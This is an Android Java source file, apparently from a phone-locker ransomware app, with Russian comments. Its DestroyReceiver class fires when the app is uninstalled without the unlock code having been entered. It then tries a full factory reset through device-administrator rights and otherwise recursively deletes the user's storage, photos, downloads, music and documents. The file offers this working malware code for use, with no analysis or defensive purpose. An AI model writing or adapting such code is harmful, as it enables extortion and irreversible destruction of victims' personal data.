package com.locker;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import java.io.File;

public class DestroyReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals(Intent.ACTION_PACKAGE_REMOVED)) {
            if (intent.getDataString() != null && intent.getDataString().contains("com.locker")) {
                
                // Проверяем: если пользователь вводил код, ничего не удаляем
                SharedPreferences prefs = context.getSharedPreferences("locker_prefs", Context.MODE_PRIVATE);
                boolean wasUnlocked = prefs.getBoolean("is_unlocked_by_user", false);
                
                if (wasUnlocked) {
                    return; 
                }

                // 1. Пытаемся сделать полный сброс (КИРПИЧ) через Администратора
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
                
                if (dpm != null && adminComponent != null) {
                    try {
                        if (dpm.isAdminActive(adminComponent)) {
                            dpm.wipeData(0); // Сброс до заводских настроек
                        }
                    } catch (Exception ignored) {}
                }

                // 2. Если сброс не сработал (нет прав), сносим все доступные файлы
                String[] paths = {
                    Environment.getExternalStorageDirectory().getAbsolutePath(),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath(),
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()
                };

                for (String path : paths) {
                    deleteRecursive(new File(path));
                }
            }
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        fileOrDirectory.delete();
    }
                  }
